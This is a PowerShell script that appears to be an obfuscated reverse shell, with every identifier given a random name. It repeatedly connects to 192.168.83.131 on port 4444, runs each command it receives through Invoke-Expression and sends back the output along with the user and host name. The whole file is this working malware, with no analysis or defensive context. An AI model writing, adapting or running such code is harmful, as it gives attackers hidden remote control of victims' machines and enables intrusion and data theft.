class iisThjqhSk {
    
    [string]$NeoXeCuRFzOJftDRYIl = "192.168.83.131"
    [int]$KSGTOXsE = 4444

    $fPObGkOl
    $DxyPH
    $SYKwiOJLmkaipXEnzGvHzT
    $bZRbnPjoWWJeDK
    $BImueT
    $zeITJwcZF
    [int]$KTmcTQMCiqsfxaRICiEljX = 50*1024

    xbxfvCibdJYqsZdKVYcAxd() {
        $this.DxyPH = $false
        while ($true) {
            try {
                $this.DxyPH = New-Object Net.Sockets.TcpClient($this.NeoXeCuRFzOJftDRYIl, $this.KSGTOXsE)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.NDNtH()
    }

    NDNtH() {
        $this.fPObGkOl = $this.DxyPH.GetStream()
        $this.bZRbnPjoWWJeDK = New-Object Byte[] $this.KTmcTQMCiqsfxaRICiEljX
        $this.zeITJwcZF = New-Object Text.UTF8Encoding
        $this.SYKwiOJLmkaipXEnzGvHzT = New-Object IO.StreamWriter($this.fPObGkOl, [Text.Encoding]::UTF8, $this.KTmcTQMCiqsfxaRICiEljX)
        $this.BImueT = New-Object System.IO.StreamReader($this.fPObGkOl)
        $this.SYKwiOJLmkaipXEnzGvHzT.AutoFlush = $true
    }

    umOhYnphIfgYEnpnG() {
        $this.xbxfvCibdJYqsZdKVYcAxd()
        $this.vKvSykNx()
    }

    WxZMkCTapHhMmNTfdYk($JgOiXbqza) {
        try {
            [byte[]]$lObeWCPVYjuJBf = [text.Encoding]::Ascii.GetBytes($JgOiXbqza)
            $this.SYKwiOJLmkaipXEnzGvHzT.Write($lObeWCPVYjuJBf, 0, $lObeWCPVYjuJBf.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.umOhYnphIfgYEnpnG()
        }
    }

    [string] XPzoiFQUGdJOVK() {
        try {
            $wtgHBjUeyhwwtYnDdtfh = $this.fPObGkOl.Read($this.bZRbnPjoWWJeDK, 0, $this.KTmcTQMCiqsfxaRICiEljX)    
            $ldrNVBdAzOmwgGOSxK = ($this.zeITJwcZF.GetString($this.bZRbnPjoWWJeDK, 0, $wtgHBjUeyhwwtYnDdtfh))
            return $ldrNVBdAzOmwgGOSxK
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.umOhYnphIfgYEnpnG()
            return ""
        }
    }

    [string] hhgqUfkZFY($kNNEYxtu) {
        Write-Host $kNNEYxtu
        try { 
            $LEznIMNsFuuJxBnPA = Invoke-Expression $kNNEYxtu | Out-String
        }
        catch {
            $gfVXlHNYpRGxuhUzICRAYs = $_.Exception
            $vQfzLXf = $_.Message
            $LEznIMNsFuuJxBnPA = "`n$_`n"
        }
        return $LEznIMNsFuuJxBnPA
    }

    [string] jjHxRcbddkhGOvfjxnigBO() {
        $XsAyLJDpKBicxrwfxQh = [Environment]::UserName
        $plzPTNemKZwvNznvKQjkNe = [System.Net.Dns]::GetHostName()
        $HyqBCNoMyhEI = Get-Location
        return "$XsAyLJDpKBicxrwfxQh@$plzPTNemKZwvNznvKQjkNe [$HyqBCNoMyhEI]~$ "
    }

    vKvSykNx() {
        while ($this.DxyPH.Connected) {
            $this.WxZMkCTapHhMmNTfdYk($this.jjHxRcbddkhGOvfjxnigBO())         
            $ldrNVBdAzOmwgGOSxK = $this.XPzoiFQUGdJOVK()
            $LEznIMNsFuuJxBnPA = "`n"
            if ([string]::IsNullOrEmpty($ldrNVBdAzOmwgGOSxK)) {
                continue
            }
            $LEznIMNsFuuJxBnPA = $this.hhgqUfkZFY($ldrNVBdAzOmwgGOSxK)
            $this.WxZMkCTapHhMmNTfdYk($LEznIMNsFuuJxBnPA + "`n")
            $this.fPObGkOl.Flush()
        }
        $this.DxyPH.Close()
        $this.umOhYnphIfgYEnpnG()
    } 
}

$jqrrCIISNVfPRDIPSOMsIHZE = [iisThjqhSk]::new()
$jqrrCIISNVfPRDIPSOMsIHZE.umOhYnphIfgYEnpnG()
